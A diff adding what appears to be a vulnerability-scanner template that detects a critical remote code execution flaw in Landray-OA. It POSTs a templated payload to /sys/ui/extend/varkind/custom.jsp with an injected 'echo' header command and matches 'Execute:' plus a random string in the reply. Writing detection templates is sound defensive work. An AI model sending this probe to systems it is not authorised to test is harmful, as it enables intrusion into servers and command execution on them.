@@ -1,0 +1,28 @@
+id: landray-oa-sysSearchMain-editParam-rce
+brief:
+    title: Landray-OA - Remote code Execution
+    by: SleepingBag945
+    level: critical
+    about: Landray-OA through sysSearchMain editParam is vulnerable to Remote Code Execution.
+    label:
+        - landray
+        - rce
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/sys/ui/extend/varkind/custom.jsp'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+        Test: echo {{randstr}}
+      body: var={{payload}}
+      signs:
+        - "on": word
+          has:
+            - 'Execute:'
+            - '{{randstr}}'
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
